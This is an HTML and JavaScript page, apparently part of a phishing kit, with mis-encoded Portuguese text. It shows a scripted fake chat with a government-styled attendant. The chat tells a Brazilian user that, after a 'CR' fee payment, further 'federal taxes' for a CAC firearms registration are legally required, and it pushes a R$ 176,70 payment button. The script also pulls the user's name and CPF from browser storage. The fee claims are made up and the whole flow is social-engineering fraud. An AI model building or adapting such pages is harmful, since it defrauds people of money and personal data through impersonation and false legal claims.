<style>
    :root {
        --receita-blue: #004628;
        --receita-success: #28a745;
        --receita-danger: #dc3545;
    }

    @keyframes slideDown {
        0% { 
            transform: translateY(-100%);
            opacity: 0;
        }
        100% { 
            transform: translateY(0);
            opacity: 1;
        }
    }

    @keyframes fadeIn {
        0% { opacity: 0; }
        100% { opacity: 1; }
    }

    html, body {
        font-family: 'Sora', sans-serif;
        background-color: #f5f5f5;
        color: #333;
        line-height: 1.6;
        margin: 0;
        padding: 0;
        height: 100vh;
        overflow: hidden;
        overflow-x: hidden;
        box-sizing: border-box;
        touch-action: pan-y;
        -webkit-overflow-scrolling: touch;
    }

    * {
        box-sizing: border-box;
    }

    .chat-container {
        overflow-y: auto;
        overflow-x: hidden;
        padding: 10px 20px 80px 20px;
        scroll-behavior: smooth;
        display: flex;
        flex-direction: column;
        background-color: #f5f5f5;
        height: 100%;
        touch-action: pan-y;
        -webkit-overflow-scrolling: touch;
        position: relative;
        width: 100%;
        max-width: 100%;
    }

    .chat-container::-webkit-scrollbar {
        width: 6px;
    }

    .chat-container::-webkit-scrollbar-track {
        background: #f1f1f1;
    }

    .chat-container::-webkit-scrollbar-thumb {
        background: #c9c9c9;
        border-radius: 10px;
    }

    .message-bubble {
        margin-bottom: 16px;
        max-width: 75%;
        position: relative;
        display: flex;
        flex-direction: column;
    }

    .incoming-message {
        align-self: flex-start;
        margin-right: auto;
        padding-left: 0px;
        margin-left: -10px;
    }

    .outgoing-message {
        align-self: flex-end;
        margin-left: auto;
        align-items: flex-end;
        padding-right: 0px;
        margin-right: -10px;
    }

    .message-content {
        padding: 14px 18px;
        border-radius: 18px;
        box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        margin-top: 4px;
        position: relative;
        line-height: 1.5;
    }

    .incoming-message .message-content {
        background-color: #004628;
        border-top-left-radius: 2px;
        text-align: left;
        color: white;
        min-width: 200px;
    }

    .outgoing-message .message-content {
        background-color: #d4d4d4;
        border-top-right-radius: 2px;
        text-align: right;
        border-right: 2px solid #999;
    }

    .chat-avatar {
        width: 46px;
        height: 46px;
        border-radius: 50%;
        object-fit: cover;
        border: 2px solid var(--receita-blue);
        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
    }

    .status-indicator {
        position: absolute;
        bottom: 0;
        right: 0;
        width: 14px;
        height: 14px;
        border-radius: 50%;
        background-color: var(--receita-success);
        border: 2px solid white;
    }

    .chat-options {
        margin-top: 10px;
        margin-bottom: 20px;
        display: flex;
        flex-direction: column;
        gap: 12px;
        padding-left: 0px;
        margin-left: -10px;
        max-width: 75%;
    }

    .option-button {
        background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
        border: 1px solid #d0d0d0;
        border-radius: 2px;
        padding: 16px 20px;
        text-align: left;
        transition: all 0.2s ease;
        cursor: pointer;
        font-weight: 500;
        box-shadow: 
            0 4px 8px rgba(0,0,0,0.1),
            inset 0 1px 0 rgba(255,255,255,0.5),
            inset 0 -1px 0 rgba(0,0,0,0.1);
        font-size: 1.05rem;
        margin-bottom: 12px;
        color: #333;
    }

    .option-button:hover {
        background: linear-gradient(145deg, #f0f0f0, #ffffff);
        border-color: var(--receita-blue);
        transform: translateY(-2px);
        box-shadow: 
            0 6px 16px rgba(0,0,0,0.15),
            inset 0 1px 0 rgba(255,255,255,0.7),
            inset 0 -1px 0 rgba(0,0,0,0.05);
    }

    .option-button i {
        font-size: 1.2rem;
        margin-right: 10px;
        vertical-align: middle;
    }

    .avatar-container {
        position: relative;
        margin-right: 15px;
        flex-shrink: 0;
    }

    .typing-animation {
        display: flex;
        align-items: center;
        column-gap: 5px;
        height: 15px;
    }

    .typing-animation .dot {
        display: block;
        width: 7px;
        height: 7px;
        opacity: 0.8;
        border-radius: 50%;
        background-color: white;
        animation: loadingFade 1s infinite;
    }

    .typing-animation .dot:nth-child(1) {
        animation-delay: 0s;
    }

    .typing-animation .dot:nth-child(2) {
        animation-delay: 0.2s;
    }

    .typing-animation .dot:nth-child(3) {
        animation-delay: 0.4s;
    }

    @keyframes loadingFade {
        0% {
            opacity: 0.3;
            transform: scale(0.8);
        }
        50% {
            opacity: 1;
            transform: scale(1.2);
        }
        100% {
            opacity: 0.3;
            transform: scale(0.8);
        }
    }

    @media (max-width: 576px) {
        .message-bubble {
            max-width: 85%;
        }

        .chat-container {
            height: 100% !important;
            padding: 15px 15px 100px 15px !important;
            background-color: #f5f5f5 !important;
            margin: 0 !important;
            overflow-x: hidden !important;
            touch-action: pan-y !important;
            width: 100% !important;
            max-width: 100% !important;
        }

        body {
            overflow-x: hidden !important;
            touch-action: pan-y !important;
            width: 100vw !important;
            max-width: 100vw !important;
        }

        main {
            width: 100vw !important;
            max-width: 100vw !important;
            overflow-x: hidden !important;
            touch-action: pan-y !important;
        }
    }
</style>

<body>

    <!-- Attendant Info -->
    <div class="text-gray-800 px-4 md:px-8 py-3" style="background-color: #e5e7eb !important; background: #e5e7eb !important; min-height: 60px;">
        <div class="max-w-7xl mx-auto">

    <main style="height: calc(100vh - 120px); background-color: #f5f5f5; padding: 0 1rem; margin: 0; overflow: hidden; overflow-x: hidden; touch-action: pan-y; position: relative; width: 100%; max-width: 100vw;">
        <div style="height: 100%; max-width: 1152px; margin: 0 auto; background-color: #f5f5f5; position: relative; width: 100%; overflow-x: hidden;">
            <!-- Chat Body -->
            <div style="height: 100%; overflow: hidden; overflow-x: hidden; position: relative; background-color: #f5f5f5; width: 100%; max-width: 100%;">
                <div class="chat-container" id="chatContainer" style="height: 100%; background-color: #f5f5f5; margin: 0; width: 100%; max-width: 100%;">

<script>
// Function to properly capitalize names
function capitalizeNames(name) {
    if (!name) return 'Nome n√£o informado';
    return name.toLowerCase().split(' ').map(word => 
        word.charAt(0).toUpperCase() + word.slice(1)
    ).join(' ');
}

// Function to get user name from localStorage (checking multiple possible keys)
function getUserName() {
    const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
    
    // Try different possible keys for the name
    const name = customerData.nome || 
                 customerData.full_name || 
                 localStorage.getItem('full_name') || 
                 localStorage.getItem('nome') || 
                 localStorage.getItem('name') || 
                 '';
    
    console.log('Dados do usu√°rio encontrados:', customerData);
    console.log('Nome extra√≠do:', name);
    
    return name;
}

// Function to get first name
function getFirstName() {
    const fullName = getUserName();
    if (!fullName || fullName === 'Nome n√£o informado') {
        return 'Candidato';
    }
    return capitalizeNames(fullName.split(' ')[0]);
}

// Function to get full name
function getFullName() {
    const fullName = getUserName();
    return fullName ? capitalizeNames(fullName) : 'Nome n√£o informado';
}

// Function to get CPF
function getUserCPF() {
    const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
    return customerData.cpf || localStorage.getItem('cpf') || 'CPF n√£o informado';
}

// Get customer data from localStorage (saved when accessing via CPF slug)
const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
const firstName = getFirstName();
const fullName = getFullName();
const cpf = getUserCPF();

// New chat sequence for post-payment support
const chatSequence = [
    {
        message: `üéâ Parab√©ns ${getFirstName()}! Seu pagamento da Taxa de Emiss√£o do CR foi processado com sucesso.`,
        delay: 3000
    },
    {
        message: `Para finalizar completamente seu cadastro CAC, ainda s√£o necess√°rios os pagamentos dos impostos federais obrigat√≥rios:`,
        delay: 6000
    },
    {
        message: `‚Ä¢ Taxa da Guia de Tr√°fego (GT) - R$ 98,40\n‚Ä¢ Taxa de Aquisi√ß√£o de armas e muni√ß√µes - R$ 78,30`,
        delay: 8000
    },
    {
        message: `Essas taxas s√£o obrigat√≥rias por lei federal e s√£o pagas uma √∫nica vez durante todo o processo CAC.`,
        delay: 7000
    },
    {
        message: `Podemos prosseguir com o pagamento dessas taxas agora?`,
        delay: 5000,
        showOptions: 'taxaOptions'
    }
];

// Chat container
const chatContainer = document.getElementById('chatContainer');

// Improved scroll function for better mobile experience
function scrollToBottom() {
    setTimeout(() => {
        chatContainer.scrollTop = chatContainer.scrollHeight + 100;
    }, 100);
}

// Add message to chat
function addMessage(text, isIncoming = true, shouldScroll = true) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;

    messageDiv.innerHTML = `
        <div class="message-content">
            ${text.replace(/\n/g, '<br>')}
        </div>
    `;

    chatContainer.appendChild(messageDiv);

    if (shouldScroll) {
        scrollToBottom();
    }
}

// Show typing indicator
function showTyping(duration = 3000) {
    return new Promise(resolve => {
        const typingDiv = document.createElement('div');
        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
        typingDiv.style.paddingLeft = '0px';
        typingDiv.style.marginLeft = '-10px';
        typingDiv.innerHTML = `
            <div class="message-content d-flex align-items-center" style="background-color: #004628; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
                <div class="typing-animation">
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </div>
            </div>
        `;

        chatContainer.appendChild(typingDiv);
        scrollToBottom();

        setTimeout(() => {
            if (typingDiv.parentNode) {
                typingDiv.parentNode.removeChild(typingDiv);
            }
            resolve();
        }, duration);
    });
}

// Show options
function showOptions(optionsId) {
    let optionsHtml = '';

    if (optionsId === 'taxaOptions') {
        optionsHtml = `
            <div class="chat-options">
                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Sim, vou prosseguir com o pagamento das taxas', 'redirectToTaxa')">
                    <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
                    Sim, vou prosseguir com o pagamento das taxas
                </button>
                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Preciso de mais informa√ß√µes sobre as taxas', 'moreInfo')">
                    <i class="fas fa-info-circle" style="color: var(--receita-blue);"></i> 
                    Preciso de mais informa√ß√µes sobre as taxas
                </button>
            </div>
        `;
    }

    if (optionsHtml) {
        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
        scrollToBottom();
    }
}

// Handle option click
function handleOptionClick(button, responseText, nextAction) {
    // Add user response to chat
    addMessage(responseText, false, true);

    // Remove the options container
    const optionsContainer = button.closest('.chat-options');
    if (optionsContainer) {
        optionsContainer.remove();
    }

    // Show typing and continue conversation
    setTimeout(async () => {
        if (nextAction === 'redirectToTaxa') {
            await showTyping(3000);
            addMessage(`Perfeito! Redirecionando voc√™ para o pagamento das taxas federais...`, true, true);

            // Show taxa button
            setTimeout(() => {
                showTaxaButton();
            }, 2000);
        } else if (nextAction === 'moreInfo') {
            await showTyping(4000);
            addMessage(`As taxas federais s√£o estabelecidas por lei e cobrem:\n\n‚Ä¢ GT (Guia de Tr√°fego): Permite transporte legal de armas\n‚Ä¢ Taxa de Aquisi√ß√£o: Autoriza compra de armas e muni√ß√µes\n\nS√£o valores √∫nicos e obrigat√≥rios para conclus√£o do CAC.`, true, true);
            
            await showTyping(5000);
            addMessage(`Agora podemos prosseguir com o pagamento?`, true, true);
            
            setTimeout(() => {
                showTaxaButton();
            }, 2000);
        }
    }, 1000);
}

// Show taxa button
function showTaxaButton() {
    const buttonHtml = `
        <div class="payment-button-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
            <button class="payment-button" onclick="window.location.href='/taxa'" style="
                background: #28a745;
                border: none;
                border-radius: 2px;
                padding: 16px 24px;
                color: white;
                font-weight: 600;
                font-size: 1.1rem;
                cursor: pointer;
                width: 100%;
                text-align: center;
                transition: all 0.3s ease;
                box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
            " onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'" 
               onmouseout="this.style.background='#28a745'; this.style.transform='translateY(0)'">
                <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
                Pagar Taxas Federais (R$ 176,70)
            </button>
        </div>
    `;

    chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
    chatContainer.scrollTop = chatContainer.scrollHeight;
}

// Initialize chat
async function initializeChat() {
    await new Promise(resolve => setTimeout(resolve, 1000));

    for (let i = 0; i < chatSequence.length; i++) {
        const message = chatSequence[i];

        // Show typing
        await showTyping(message.delay);

        // Add message (only if not empty)
        if (message.message) {
            addMessage(message.message, true, true);
        }

        // Show options if specified
        if (message.showOptions) {
            setTimeout(() => {
                showOptions(message.showOptions);
            }, 1000);
        }
    }
}

// Start chat when page loads
document.addEventListener('DOMContentLoaded', initializeChat);
</script>
